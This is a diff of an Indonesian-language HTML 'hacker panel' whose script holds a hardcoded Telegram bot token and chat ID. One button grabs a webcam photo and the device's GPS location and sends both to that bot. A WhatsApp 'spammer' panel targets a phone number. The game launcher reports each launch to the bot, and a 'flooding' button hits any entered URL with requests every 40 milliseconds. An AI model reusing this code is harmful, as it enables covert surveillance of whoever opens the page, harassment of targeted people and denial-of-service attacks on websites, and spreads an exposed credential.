@@ -3,24 +3,41 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>[ EDWARD OMNI V.4.8 PRO ]</title>
+    <title>[ EDWARD OMNI V.4.9 GACOR ]</title>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; text-align: center; }
-        .panel { border: 2px solid #0f0; border-radius: 10px; padding: 15px; margin-bottom: 20px; box-shadow: 0 0 15px #0f0; background: rgba(0, 30, 0, 0.9); }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 15px; text-align: center; }
+        .panel { border: 2px solid #0f0; border-radius: 10px; padding: 15px; margin-bottom: 15px; box-shadow: 0 0 10px #0f0; background: rgba(0, 20, 0, 0.9); }
         .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
-        button { background: #0f0; color: #000; border: none; padding: 12px; font-weight: bold; cursor: pointer; width: 100%; border-radius: 5px; text-transform: uppercase; }
-        input { background: #111; border: 1px solid #0f0; color: #0f0; padding: 10px; width: 85%; margin: 5px 0; border-radius: 5px; }
-        .danger { border-color: #ff0000; box-shadow: 0 0 15px #ff0000; }
-        #status { color: yellow; font-size: 12px; }
+        button { background: #0f0; color: #000; border: none; padding: 12px; font-weight: bold; cursor: pointer; width: 100%; border-radius: 5px; text-transform: uppercase; transition: 0.3s; }
+        button:active { transform: scale(0.95); }
+        input { background: #111; border: 1px solid #0f0; color: #0f0; padding: 10px; width: 90%; margin: 5px 0; border-radius: 5px; font-size: 14px; }
+        .danger { border-color: #ff0000; box-shadow: 0 0 10px #ff0000; }
+        .danger h3 { color: #ff0000; }
+        h1 { font-size: 20px; text-shadow: 0 0 10px #0f0; }
+        p { font-size: 10px; color: yellow; }
     </style>
 </head>
 <body>
 
-    <h1>[ EDWARD OMNI V.4.8 ]</h1>
-    <p id="status">DEVICE: OPPO A18 | SYSTEM: ONLINE</p>
+    <h1>[ EDWARD OMNI V.4.9 ]</h1>
+    <p>DEVICE: OPPO A18 | SYSTEM: GACOR PARAH</p>
 
     <div class="panel">
-        <h3>🎮 GAME LAUNCHER (AUTO-OPEN)</h3>
+        <h3>📡 SATELLITE & PHOTO</h3>
+        <button onclick="takeSnap()" style="background: #fff; color: #000;">📸 AMBIL FOTO & LOKASI</button>
+        <video id="video" style="display:none;" autoplay></video>
+        <canvas id="canvas" style="display:none;"></canvas>
+    </div>
+
+    <div class="panel">
+        <h3>⚡ WA SPAMMER</h3>
+        <input type="number" id="noWA" placeholder="Nomor: 628xxxxxxx">
+        <input type="text" id="msgWA" placeholder="Pesan Serangan...">
+        <button onclick="waSpam()">KIRIM SPAM WA</button>
+    </div>
+
+    <div class="panel">
+        <h3>🎮 GAME LAUNCHER</h3>
         <div class="grid">
             <button onclick="launch('com.dts.freefireth')">FREE FIRE</button>
             <button onclick="launch('com.mobile.legends')">MLBB</button>
@@ -29,31 +46,20 @@
         </div>
     </div>
 
-    <div class="panel">
-        <h3>📡 SATELLITE & CAMERA</h3>
-        <button onclick="takeSnap()" style="background: #fff; color: #000;">AMBIL FOTO & LOKASI</button>
-        <video id="video" style="display:none;" autoplay></video>
-        <canvas id="canvas" style="display:none;"></canvas>
-    </div>
-
     <div class="panel danger">
         <h3>💣 JUDOL ATTACKER</h3>
-        <input type="text" id="target" placeholder="URL Target...">
-        <button onclick="startAttack()">LANCARKAN FLOODING</button>
+        <input type="text" id="targetJudol" placeholder="URL Target Judol...">
+        <button onclick="startAttack()" style="background: #ff0000; color: white;">START FLOODING</button>
     </div>
 
     <script>
         const TOKEN = "8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g";
         const CHAT_ID = "7898572558";
 
-        // 🎮 FUNGSI BUKA GAME (DEEP LINK)
-        function launch(pkg) {
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=🎮 EDWARD MEMBUKA GAME: ${pkg}`);
-            // Mencoba membuka via URI Scheme Android
-            window.location.href = "intent://#Intent;scheme=android-app;package=" + pkg + ";end";
+        function kirimTele(msg) {
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
         }
 
-        // 📸 FUNGSI AMBIL FOTO & KIRIM KE TELEGRAM
         async function takeSnap() {
             const v = document.getElementById('video');
             const c = document.getElementById('canvas');
@@ -61,18 +67,17 @@
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 v.srcObject = stream;
                 setTimeout(() => {
-                    c.width = v.videoWidth;
-                    c.height = v.videoHeight;
+                    c.width = v.videoWidth; c.height = v.videoHeight;
                     c.getContext('2d').drawImage(v, 0, 0);
-                    const imgData = c.toDataURL('image/jpeg');
-                    kirimFoto(imgData);
+                    const img = c.toDataURL('image/jpeg');
+                    kirimFoto(img);
                     stream.getTracks().forEach(t => t.stop());
-                }, 1000);
-            } catch (e) { alert("Izinkan Kamera Master!"); }
+                }, 1500);
+            } catch (e) { alert("Izinkan Kamera!"); }
             
             navigator.geolocation.getCurrentPosition(p => {
                 const map = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=📍 LOKASI JELAS:\n${map}`);
+                kirimTele(`📍 LOKASI TARGET:\n${map}`);
             });
         }
 
@@ -92,12 +97,24 @@
             return new Blob([ab], { type: 'image/jpeg' });
         }
 
+        function waSpam() {
+            let n = document.getElementById('noWA').value;
+            let m = document.getElementById('msgWA').value || "DIHECK EDWARD";
+            kirimTele(`⚔️ WA SPAM!\nTarget: ${n}\nPesan: ${m}`);
+            window.open(`https://api.whatsapp.com/send?phone=${n}&text=${encodeURIComponent(m)}`, '_blank');
+        }
+
+        function launch(pkg) {
+            kirimTele(`🎮 MEMBUKA GAME: ${pkg}`);
+            window.location.href = "intent://#Intent;scheme=android-app;package=" + pkg + ";end";
+        }
+
         function startAttack() {
-            const t = document.getElementById('target').value;
-            if(!t) return;
-            setInterval(() => { fetch(t, { mode: 'no-cors' }).catch(() => {}); }, 50);
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=💣 SERANGAN MASIF KE: ${t}`);
-            alert("Serangan Berjalan!");
+            let t = document.getElementById('targetJudol').value;
+            if(!t) return alert("Isi URL!");
+            kirimTele(`💣 ATTACKING JUDOL!\nTarget: ${t}`);
+            setInterval(() => { fetch(t, { mode: 'no-cors' }).catch(() => {}); }, 40);
+            alert("Flooding Berjalan Gacor!");
         }
     </script>
 </body>
